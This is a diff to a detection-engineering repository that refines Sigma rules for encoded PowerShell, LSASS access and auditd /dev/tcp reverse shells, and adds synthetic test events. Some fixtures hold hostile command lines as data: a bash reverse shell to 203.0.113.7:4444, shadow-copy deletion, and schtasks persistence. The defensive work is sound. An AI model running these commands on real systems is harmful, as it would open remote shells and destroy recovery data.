@@ -1,0 +1,525 @@
+diff --git a/README.md b/README.md
+index 6386a9f..e3b4353 100644
+--- a/README.md
++++ b/README.md
+@@ -106,6 +106,11 @@ Declared in [`support.yaml`](support.yaml); CI re-checks every `unsupported` ent
+   backend is part of this pipeline).
+ - Splunk and ES|QL correlation queries use fixed 15-minute buckets; Zircolite uses a sliding window (see
+   [docs/pipeline.md](docs/pipeline.md)).
++- The Elasticsearch engine runs a raw-field Lucene conversion on a test index whose strings are lowercase-normalised.
++  The ECS-mapped Lucene and ES|QL goldens are not executed; on a standard ECS index their `process.command_line`
++  wildcards and ES|QL `like` / `==` are case-sensitive, so a mixed-case command line could slip past them.
++- The auditd rules assume decoded records (`ausearch -i`, laurel or auditbeat): raw auditd hex-encodes EXECVE
++  arguments that contain spaces.
+ 
+ ## License
+ 
+diff --git a/WRITEUP.es.md b/WRITEUP.es.md
+index f358813..d1d6ceb 100644
+--- a/WRITEUP.es.md
++++ b/WRITEUP.es.md
+@@ -27,7 +27,7 @@ bundle: "Publicado en el sitio del portafolio con su checksum SHA-256"
+ | **Rol** | Ingeniero de detección que convierte un puñado de búsquedas de SIEM en un repositorio de reglas revisado y probado |
+ | **Entorno** | Repositorio público de GitHub, runners Ubuntu de GitHub, contenedor de servicio Elasticsearch 9.5.3 |
+ | **Herramientas** | Sigma, sigma-cli 3.1.0 / pySigma 1.5.1, Zircolite 4.1.0, Elasticsearch, Python, pytest, gitleaks |
+-| **Entregables** | 15 reglas, 64 archivos de eventos, conversiones golden, 7 jobs de CI (10 controles), ruleset, PR de demostración, resultados |
++| **Entregables** | 15 reglas, 68 archivos de eventos, conversiones golden, 7 jobs de CI (10 controles), ruleset, 2 PR de demostración, resultados |
+ 
+ ---
+ 
+@@ -72,7 +72,9 @@ Las cinco reglas de Azure vuelven a expresar en Sigma las detecciones KQL escrit
+ - **match-zircolite** y **match-elasticsearch:** cada archivo de eventos pasa por dos motores. Los positivos deben
+   disparar en todos sus eventos (en la regla de correlación, al menos una alerta) y los negativos, casi aciertos,
+   deben quedar en silencio. Son dos motores porque una consulta puede estar bien en uno y mal en otro: los campos
+-  keyword de Elasticsearch distinguen mayúsculas si no se normalizan, mientras que Sigma no las distingue.
++  keyword de Elasticsearch distinguen mayúsculas si no se normalizan, mientras que Sigma no las distingue. El motor
++  Elasticsearch ejecuta una conversión Lucene con los nombres de campo originales (no la golden mapeada a ECS) sobre
++  un índice de prueba cuyas cadenas se normalizan a minúsculas.
+ - **coverage** mantiene la tabla ATT&CK del README y una capa de Navigator sincronizadas con las etiquetas;
+   **python** prueba los scripts; **secrets** ejecuta gitleaks sobre todo el historial.
+ 
+@@ -114,9 +116,11 @@ corren en paralelo; el más lento, `match-elasticsearch`, tardó 56 s incluido e
+ | `python` | 76 pruebas unitarias superadas |
+ | `coverage`, `secrets` | superados |
+ 
+-Los dos positivos con mayúsculas mezcladas (`PowerShell.EXE -ENC`, `SCHTASKS /CREATE`) dispararon en ambos motores,
+-así que el normalizador a minúsculas del índice de Elasticsearch cumple con la coincidencia sin distinción de
+-mayúsculas que exige Sigma.
++Los dos positivos con mayúsculas mezcladas (`PowerShell.EXE -ENC`, `SCHTASKS /CREATE`) dispararon en ambos motores.
++Del lado de Elasticsearch eso vale para el índice de prueba de este repositorio, donde cada cadena se normaliza a
++minúsculas. No dice nada de las golden ECS versionadas: no se ejecutan, y en un índice ECS estándar sus comodines
++sobre `process.command_line` y las comparaciones `like` / `==` de ES|QL distinguen mayúsculas (según la
++documentación de Elastic; no se probó aquí).
+ 
+ **Ruleset** `24264960` en `main`: pull request obligatorio, los 10 controles obligatorios y actualizados, historial
+ lineal, sin force push ni borrado.
+@@ -154,6 +158,10 @@ dejado pasar los dos cambios.
+   consultas, los intervalos fijos partirían en 5 + 5.
+ - **Los motores tienen sus manías.** Zircolite elimina los guiones bajos de los nombres de campo, y una regla de
+   correlación solo se convierte si está en el mismo archivo que su regla base.
++- **Un segundo lector encuentra las variantes que no escribiste.** La revisión final encontró tres huecos que los
++  eventos no cubrían: PowerShell acepta cualquier prefijo de `-EncodedCommand` (`-Encoded` se escapaba), un volcador
++  renombrado `MsMpEng.exe` fuera de la carpeta de Defender evadía el filtro de LSASS, y `bash -l -c` deja la carga en
++  `a3`. Cada uno se convirtió en un evento positivo que falló primero y pasó al corregir la regla.
+ 
+ ## 8. Límites
+ 
+@@ -162,7 +170,11 @@ dejado pasar los dos cambios.
+   en vivo.
+ - Sin conversión a Wazuh (fuera de alcance, en la hoja de ruta).
+ - Elasticsearch solo se ejercita en CI (servicio Docker); Zircolite también se ejecuta en local.
+-- Las consultas de Splunk, ES|QL y KQL se generan y se comparan, pero no se ejecutan.
++- Lo que ejecuta Elasticsearch es una conversión Lucene con los nombres de campo originales sobre un índice de prueba
++  normalizado a minúsculas. Las golden Lucene y ES|QL mapeadas a ECS, Splunk y KQL se generan y se comparan, pero no
++  se ejecutan.
++- Las reglas de auditd suponen registros decodificados: auditd sin procesar codifica en hexadecimal los argumentos de
++  EXECVE que contienen espacios, así que el colector debe interpretarlos antes (`ausearch -i`, laurel o auditbeat).
+ 
+ ## 9. Cómo reproducirlo
+ 
+diff --git a/WRITEUP.md b/WRITEUP.md
+index 0bd9f86..75a6a2b 100644
+--- a/WRITEUP.md
++++ b/WRITEUP.md
+@@ -25,7 +25,7 @@ bundle: "Published on the portfolio site with its SHA-256 checksum"
+ | **Role played** | Detection engineer turning a handful of SIEM searches into a reviewed, tested rule repository |
+ | **Environment** | Public GitHub repository, GitHub-hosted Ubuntu runners, Elasticsearch 9.5.3 service container |
+ | **Tools** | Sigma, sigma-cli 3.1.0 / pySigma 1.5.1, Zircolite 4.1.0, Elasticsearch, Python, pytest, gitleaks |
+-| **Deliverable** | 15 rules, 64 fixture files, golden conversions, 7 CI jobs (10 checks), branch ruleset, 2 demo PRs, results |
++| **Deliverable** | 15 rules, 68 fixture files, golden conversions, 7 CI jobs (10 checks), branch ruleset, 2 demo PRs, results |
+ 
+ ---
+ 
+@@ -69,7 +69,8 @@ Tags follow ATT&CK v19.
+ - **match-zircolite** and **match-elasticsearch**: every fixture file is run through two engines. Positive files
+   must fire on every event (on the correlation rule, at least one alert), negative files are near misses that must
+   stay silent. Two engines because a query can be right in one and wrong in another: Elasticsearch keyword fields
+-  are case-sensitive unless normalised, while Sigma is case-insensitive.
++  are case-sensitive unless normalised, while Sigma is case-insensitive. The Elasticsearch engine runs a raw-field
++  Lucene conversion (not the ECS-mapped golden) on a test index whose strings are lowercase-normalised.
+ - **coverage** keeps the README ATT&CK table and a Navigator layer in sync with the rule tags; **python** tests the
+   scripts; **secrets** runs gitleaks over the full history.
+ 
+@@ -110,8 +111,10 @@ the slowest, `match-elasticsearch`, took 56 s including the service start).
+ | `python` | 76 unit tests passed |
+ | `coverage`, `secrets` | passed |
+ 
+-Both mixed-case positives (`PowerShell.EXE -ENC`, `SCHTASKS /CREATE`) fired on both engines, so the lowercase
+-normalizer on the Elasticsearch index does what Sigma's case-insensitive matching needs.
++Both mixed-case positives (`PowerShell.EXE -ENC`, `SCHTASKS /CREATE`) fired on both engines. On the Elasticsearch
++side that holds for this repo's test index, where every string is lowercase-normalised. It says nothing about the
++committed ECS goldens: they are not executed, and on a standard ECS index their `process.command_line` wildcards
++and ES|QL `like` / `==` comparisons are case-sensitive (per Elastic's documentation; not tested here).
+ 
+ **Ruleset** `24264960` on `main`: pull request required, all 10 checks required and up to date, linear history, no
+ force pushes or deletion.
+@@ -146,6 +149,10 @@ through.
+   buckets would split 5 + 5.
+ - **Engines have quirks.** Zircolite strips underscores from field names, and a correlation rule only converts
+   when it is in the same file as its base rule.
++- **A second reader finds the variants you didn't write down.** The final review found three gaps the fixtures did
++  not cover: PowerShell accepts every prefix of `-EncodedCommand` (`-Encoded` slipped through), a dumper renamed
++  `MsMpEng.exe` outside Defender's folder bypassed the LSASS filter, and `bash -l -c` puts the payload in `a3`.
++  Each became a positive fixture that failed first, then passed once the rule was fixed.
+ 
+ ## 8. Limits
+ 
+@@ -153,7 +160,10 @@ through.
+   not measure false-positive rates on real telemetry, which needs a baseline in a live environment.
+ - No Wazuh conversion (out of scope, on the roadmap).
+ - Elasticsearch is exercised only in CI (Docker service); Zircolite runs locally too.
+-- Splunk, ES|QL and KQL queries are generated and diffed, not executed.
++- What Elasticsearch executes is a raw-field Lucene conversion on a lowercase-normalised test index. The ECS-mapped
++  Lucene and ES|QL goldens, Splunk and KQL are generated and diffed, not executed.
++- The auditd rules assume decoded records: raw auditd hex-encodes EXECVE arguments that contain spaces, so the
++  collector must interpret them first (`ausearch -i`, laurel or auditbeat).
+ 
+ ## 9. Reproduce it
+ 
+diff --git a/docs/pipeline.md b/docs/pipeline.md
+index 6487413..6dae1d3 100644
+--- a/docs/pipeline.md
++++ b/docs/pipeline.md
+@@ -57,6 +57,21 @@ These came up while building the lab (2026-09-30, sigma-cli 3.1.0 / pySigma 1.5.
+   source. A negative fixture (`VirtualNetwork` source) caught it; the asterisk is now escaped.
+ - ATT&CK v19 split Defense Evasion into Stealth and Defense Impairment and renumbered techniques (Clear Windows
+   Event Logs T1070.001 → T1685.005, Cloud Firewall T1562.007 → T1686.001).
++- The final review found three rule gaps the fixtures did not cover (PowerShell `-Encoded` and other prefixes, a
++  dumper renamed `MsMpEng.exe` outside Defender's folder, `bash -l -c` with the payload in `a3`); each now has a
++  positive fixture.
++
++## Case sensitivity per target
++
++Sigma values match case-insensitively. What each target does:
++
++| Target | Behaviour | Source |
++|---|---|---|
++| Zircolite 4.1.0 | Case-insensitive for `contains`/`endswith` and for exact matches | Tested: fixtures `PowerShell.EXE -ENC`, `SCHTASKS /CREATE`, and `UPDATE Conditional Access Policy` / `SUCCESS` all fire |
++| Elasticsearch engine (this repo) | Case-insensitive, because the test index lowercase-normalises every string | Tested in CI on the same fixtures |
++| Lucene / ES\|QL goldens on ECS | `process.executable.caseless` is safe; `process.command_line` wildcards and ES\|QL `like` / `==` are case-sensitive | Elastic's documentation; the goldens are not executed |
++| Sentinel KQL goldens | `=~`, `in~`, `contains`, `endswith` are case-insensitive | Read from the generated queries |
++| Splunk goldens | Field-value matching is case-insensitive | Splunk's documentation; not executed |
+ 
+ ## Pins that are bumped by hand
+ 
+diff --git a/docs/rule-authoring.md b/docs/rule-authoring.md
+index 672f265..440aea0 100644
+--- a/docs/rule-authoring.md
++++ b/docs/rule-authoring.md
+@@ -53,5 +53,6 @@ fails on an undeclared conversion failure and on an `unsupported` entry that has
+   group management (4732) and the audit-log-cleared event (1102); the System log (7045).
+ - **Linux auditd:** `-a always,exit -F arch=b64 -S execve -k exec`, `-w /root/.ssh -p wa -k ssh_keys`,
+   `-w /home -p wa -k home_writes`, `-w /etc/cron.d -p wa -k cron`, `-w /etc/crontab -p wa -k cron`,
+-  `-w /var/spool/cron -p wa -k cron`.
++  `-w /var/spool/cron -p wa -k cron`. The collector must decode the records (`ausearch -i`, laurel or auditbeat):
++  raw auditd hex-encodes any EXECVE argument that contains a space, and the rules match decoded text.
+ - **Azure:** Activity log, Entra audit logs and sign-in logs exported to the SIEM (see Lab 05's landing zone).
+diff --git a/portfolio.yaml b/portfolio.yaml
+index 7ce468f..6e7cb70 100644
+--- a/portfolio.yaml
++++ b/portfolio.yaml
+@@ -2,7 +2,7 @@
+ slug: detection-as-code
+ category: threat-detection-siem
+ repo_url: https://github.com/santorest/lab-06-detection-as-code
+-status: in_progress          # design | in_progress | complete — set to complete only after the owner confirms
++status: complete             # design | in_progress | complete — confirmed by the owner 2026-09-30
+ difficulty: intermediate     # beginner | intermediate | advanced
+ featured: true
+ # The CI results are real; the sample events the rules are tested against are synthetic.
+diff --git a/rules/linux/auditd_reverse_shell_dev_tcp.yml b/rules/linux/auditd_reverse_shell_dev_tcp.yml
+index c0445de..3f3eb0f 100644
+--- a/rules/linux/auditd_reverse_shell_dev_tcp.yml
++++ b/rules/linux/auditd_reverse_shell_dev_tcp.yml
+@@ -3,7 +3,8 @@ id: 507cd01b-fb21-459a-8c13-fbb1d1770be1
+ status: test
+ description: >-
+   A command line that redirects a shell to the bash /dev/tcp or /dev/udp pseudo-devices, the classic one-line
+-  reverse shell.
++  reverse shell. Needs decoded EXECVE arguments: raw auditd hex-encodes any argument containing a space, so the
++  collector must interpret the record first (ausearch -i, laurel or auditbeat).
+ references:
+   - https://attack.mitre.org/techniques/T1059/004/
+ author: Santiago Restrepo Sánchez
+@@ -24,6 +25,9 @@ detection:
+     - a2|contains:
+         - '/dev/tcp/'
+         - '/dev/udp/'
++    - a3|contains:  # bash -l -c '...'
++        - '/dev/tcp/'
++        - '/dev/udp/'
+   condition: all of selection_*
+ falsepositives:
+   - Health-check scripts that probe ports with bash /dev/tcp; allow-list them by exact command line.
+diff --git a/rules/windows/proc_access_lsass.yml b/rules/windows/proc_access_lsass.yml
+index 716a414..368657f 100644
+--- a/rules/windows/proc_access_lsass.yml
++++ b/rules/windows/proc_access_lsass.yml
+@@ -24,11 +24,13 @@ detection:
+       - '0x1438'
+       - '0x143a'
+       - '0x1fffff'
+-  filter_security_tools:
+-    SourceImage|endswith:
+-      - '\MsMpEng.exe'
+-      - '\MsSense.exe'
+-  condition: selection and not filter_security_tools
++  # Filter on the install paths, not the file names: a dumper renamed MsMpEng.exe elsewhere must still fire.
++  filter_defender:
++    SourceImage|startswith: 'C:\ProgramData\Microsoft\Windows Defender\Platform\'
++    SourceImage|endswith: '\MsMpEng.exe'
++  filter_mde:
++    SourceImage: 'C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe'
++  condition: selection and not 1 of filter_*
+ falsepositives:
+   - EDR/AV products not in the filter; add their exact SourceImage paths after baselining.
+ level: high
+diff --git a/rules/windows/proc_creation_encoded_powershell.yml b/rules/windows/proc_creation_encoded_powershell.yml
+index eda7e75..052f18c 100644
+--- a/rules/windows/proc_creation_encoded_powershell.yml
++++ b/rules/windows/proc_creation_encoded_powershell.yml
+@@ -25,8 +25,7 @@ detection:
+       - ' -e '
+       - ' -en '
+       - ' -enc '
+-      - ' -enco '
+-      - ' -encodedcommand '
++      - ' -enco'  # no trailing space: covers -enco, -encod, ... -encodedcommand
+       - ' -ec '
+   condition: all of selection_*
+ falsepositives:
+diff --git a/scripts/check_matches.py b/scripts/check_matches.py
+index 3b29344..80bd536 100644
+--- a/scripts/check_matches.py
++++ b/scripts/check_matches.py
+@@ -17,17 +17,20 @@ class ZircoliteError(RuntimeError):
+ 
+ 
+ def matched_ids(results: list[dict]) -> set[str]:
++    """TestEventIds behind every alert. An alert that names no fixture event still counts, as a placeholder id,
++    so a negative can never pass on output this function could not read."""
+     ids: set[str] = set()
+     for rule in results:
+         for match in rule.get("matches") or []:
+             if match.get("result_type") == "correlation":
+-                ids.update(
++                found = {
+                     e["event"]["TestEventId"]
+                     for e in match.get("evidence") or []
+                     if "TestEventId" in (e.get("event") or {})
+-                )
+-            elif "TestEventId" in match:
+-                ids.add(match["TestEventId"])
++                }
++            else:
++                found = {match["TestEventId"]} if "TestEventId" in match else set()
++            ids |= found or {f"<unidentified match of {rule.get('title')}>"}
+     return ids
+ 
+ 
+diff --git a/scripts/common.py b/scripts/common.py
+index 9879a86..8c90470 100644
+--- a/scripts/common.py
++++ b/scripts/common.py
+@@ -71,6 +71,9 @@ def read_jsonl(path: Path) -> list[dict]:
+             raise FixtureError(f"{path}:{n}: event is not a JSON object")
+         if not isinstance(event.get("TestEventId"), str) or not event["TestEventId"]:
+             raise FixtureError(f"{path}:{n}: missing TestEventId")
++        for field, value in event.items():
++            if isinstance(value, str) and any(ord(c) < 0x20 for c in value):
++                raise FixtureError(f"{path}:{n}: control character in field {field} (lost backslash?)")
+         events.append(event)
+     if not events:
+         raise FixtureError(f"{path}: no events")
+diff --git a/tests/events/audit_conditional_access_change/positive/03-case-variant.jsonl b/tests/events/audit_conditional_access_change/positive/03-case-variant.jsonl
+new file mode 100644
+index 0000000..45cfdf3
+--- /dev/null
++++ b/tests/events/audit_conditional_access_change/positive/03-case-variant.jsonl
+@@ -0,0 +1 @@
++{"time": "2026-09-30T12:00:00Z", "initiatedBy": "carol@corp.example", "TestEventId": "ca-case-variant", "activityDisplayName": "UPDATE Conditional Access Policy", "result": "SUCCESS"}
+diff --git a/tests/events/auditd_reverse_shell_dev_tcp/positive/03-login-shell.jsonl b/tests/events/auditd_reverse_shell_dev_tcp/positive/03-login-shell.jsonl
+new file mode 100644
+index 0000000..85401bb
+--- /dev/null
++++ b/tests/events/auditd_reverse_shell_dev_tcp/positive/03-login-shell.jsonl
+@@ -0,0 +1 @@
++{"type": "EXECVE", "msg": "audit(1790762400.123:4242):", "TestEventId": "rs-login-shell", "argc": 4, "a0": "bash", "a1": "-l", "a2": "-c", "a3": "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"}
+diff --git a/tests/events/proc_access_lsass/positive/03-renamed-msmpeng.jsonl b/tests/events/proc_access_lsass/positive/03-renamed-msmpeng.jsonl
+new file mode 100644
+index 0000000..db92b02
+--- /dev/null
++++ b/tests/events/proc_access_lsass/positive/03-renamed-msmpeng.jsonl
+@@ -0,0 +1 @@
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 10, "TargetImage": "C:\\Windows\\system32\\lsass.exe", "TestEventId": "lsass-renamed-msmpeng", "SourceImage": "C:\\Users\\Public\\MsMpEng.exe", "GrantedAccess": "0x1410"}
+diff --git a/tests/events/proc_creation_encoded_powershell/negative/01-execution-policy.jsonl b/tests/events/proc_creation_encoded_powershell/negative/01-execution-policy.jsonl
+index 724432d..cb1ff0d 100644
+--- a/tests/events/proc_creation_encoded_powershell/negative/01-execution-policy.jsonl
++++ b/tests/events/proc_creation_encoded_powershell/negative/01-execution-policy.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "neg-execpolicy", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "neg-execpolicy", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1"}
+diff --git a/tests/events/proc_creation_encoded_powershell/negative/02-encode-in-filename.jsonl b/tests/events/proc_creation_encoded_powershell/negative/02-encode-in-filename.jsonl
+index eaf54a8..973df7b 100644
+--- a/tests/events/proc_creation_encoded_powershell/negative/02-encode-in-filename.jsonl
++++ b/tests/events/proc_creation_encoded_powershell/negative/02-encode-in-filename.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "neg-filename", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\encode-report.ps1"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "neg-filename", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\encode-report.ps1"}
+diff --git a/tests/events/proc_creation_encoded_powershell/negative/03-other-binary.jsonl b/tests/events/proc_creation_encoded_powershell/negative/03-other-binary.jsonl
+index 7127dc2..868bd91 100644
+--- a/tests/events/proc_creation_encoded_powershell/negative/03-other-binary.jsonl
++++ b/tests/events/proc_creation_encoded_powershell/negative/03-other-binary.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "neg-other-binary", "Image": "C:\\Tools\\converter.exe", "CommandLine": "converter.exe -enc utf8 in.txt"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "neg-other-binary", "Image": "C:\\Tools\\converter.exe", "CommandLine": "converter.exe -enc utf8 in.txt"}
+diff --git a/tests/events/proc_creation_encoded_powershell/positive/01-enc.jsonl b/tests/events/proc_creation_encoded_powershell/positive/01-enc.jsonl
+index 7230f7b..196006b 100644
+--- a/tests/events/proc_creation_encoded_powershell/positive/01-enc.jsonl
++++ b/tests/events/proc_creation_encoded_powershell/positive/01-enc.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "enc-short", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "enc-short", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="}
+diff --git a/tests/events/proc_creation_encoded_powershell/positive/02-mixed-case.jsonl b/tests/events/proc_creation_encoded_powershell/positive/02-mixed-case.jsonl
+index 4467da0..ffde62d 100644
+--- a/tests/events/proc_creation_encoded_powershell/positive/02-mixed-case.jsonl
++++ b/tests/events/proc_creation_encoded_powershell/positive/02-mixed-case.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "enc-mixed-case", "Image": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\PowerShell.EXE", "CommandLine": "PowerShell.EXE -W Hidden -ENC SQBFAFgA"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "enc-mixed-case", "Image": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\PowerShell.EXE", "CommandLine": "PowerShell.EXE -W Hidden -ENC SQBFAFgA"}
+diff --git a/tests/events/proc_creation_encoded_powershell/positive/03-pwsh-full.jsonl b/tests/events/proc_creation_encoded_powershell/positive/03-pwsh-full.jsonl
+index 5af8e6c..7fc12d5 100644
+--- a/tests/events/proc_creation_encoded_powershell/positive/03-pwsh-full.jsonl
++++ b/tests/events/proc_creation_encoded_powershell/positive/03-pwsh-full.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "enc-pwsh-full", "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh.exe -EncodedCommand SQBFAFgA -NoLogo"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "enc-pwsh-full", "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh.exe -EncodedCommand SQBFAFgA -NoLogo"}
+diff --git a/tests/events/proc_creation_encoded_powershell/positive/04-encoded-abbrev.jsonl b/tests/events/proc_creation_encoded_powershell/positive/04-encoded-abbrev.jsonl
+new file mode 100644
+index 0000000..80b3033
+--- /dev/null
++++ b/tests/events/proc_creation_encoded_powershell/positive/04-encoded-abbrev.jsonl
+@@ -0,0 +1 @@
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "enc-encoded-abbrev", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP -Encoded SQBFAFgA"}
+diff --git a/tests/events/proc_creation_schtasks_create/negative/01-query.jsonl b/tests/events/proc_creation_schtasks_create/negative/01-query.jsonl
+index fe7028a..1786998 100644
+--- a/tests/events/proc_creation_schtasks_create/negative/01-query.jsonl
++++ b/tests/events/proc_creation_schtasks_create/negative/01-query.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "neg-query", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /query /fo LIST"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "neg-query", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /query /fo LIST"}
+diff --git a/tests/events/proc_creation_schtasks_create/negative/02-delete.jsonl b/tests/events/proc_creation_schtasks_create/negative/02-delete.jsonl
+index 8b6bf5e..ff64df4 100644
+--- a/tests/events/proc_creation_schtasks_create/negative/02-delete.jsonl
++++ b/tests/events/proc_creation_schtasks_create/negative/02-delete.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "neg-delete", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /delete /tn Updater /f"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "neg-delete", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /delete /tn Updater /f"}
+diff --git a/tests/events/proc_creation_schtasks_create/positive/01-create.jsonl b/tests/events/proc_creation_schtasks_create/positive/01-create.jsonl
+index 6ded41c..389bc23 100644
+--- a/tests/events/proc_creation_schtasks_create/positive/01-create.jsonl
++++ b/tests/events/proc_creation_schtasks_create/positive/01-create.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "task-create", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "task-create", "Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon"}
+diff --git a/tests/events/proc_creation_schtasks_create/positive/02-upper.jsonl b/tests/events/proc_creation_schtasks_create/positive/02-upper.jsonl
+index ca0ab25..f44a833 100644
+--- a/tests/events/proc_creation_schtasks_create/positive/02-upper.jsonl
++++ b/tests/events/proc_creation_schtasks_create/positive/02-upper.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "task-create-upper", "Image": "C:\\WINDOWS\\SYSTEM32\\SCHTASKS.EXE", "CommandLine": "SCHTASKS /CREATE /TN X /TR calc.exe /SC DAILY"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "task-create-upper", "Image": "C:\\WINDOWS\\SYSTEM32\\SCHTASKS.EXE", "CommandLine": "SCHTASKS /CREATE /TN X /TR calc.exe /SC DAILY"}
+diff --git a/tests/events/proc_creation_shadow_copy_delete/negative/01-list.jsonl b/tests/events/proc_creation_shadow_copy_delete/negative/01-list.jsonl
+index 2a00282..fa6074c 100644
+--- a/tests/events/proc_creation_shadow_copy_delete/negative/01-list.jsonl
++++ b/tests/events/proc_creation_shadow_copy_delete/negative/01-list.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "neg-list", "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe list shadows"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "neg-list", "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe list shadows"}
+diff --git a/tests/events/proc_creation_shadow_copy_delete/negative/02-wmic-list.jsonl b/tests/events/proc_creation_shadow_copy_delete/negative/02-wmic-list.jsonl
+index d5d9109..83f4501 100644
+--- a/tests/events/proc_creation_shadow_copy_delete/negative/02-wmic-list.jsonl
++++ b/tests/events/proc_creation_shadow_copy_delete/negative/02-wmic-list.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "neg-wmic-list", "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic shadowcopy list brief"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "neg-wmic-list", "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "CommandLine": "wmic shadowcopy list brief"}
+diff --git a/tests/events/proc_creation_shadow_copy_delete/positive/01-vssadmin.jsonl b/tests/events/proc_creation_shadow_copy_delete/positive/01-vssadmin.jsonl
+index 0d2a18f..ce42a48 100644
+--- a/tests/events/proc_creation_shadow_copy_delete/positive/01-vssadmin.jsonl
++++ b/tests/events/proc_creation_shadow_copy_delete/positive/01-vssadmin.jsonl
+@@ -1 +1 @@
+-{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\u0007lice", "TestEventId": "vss-delete", "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}
++{"Channel": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "User": "CORP\\alice", "TestEventId": "vss-delete", "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}
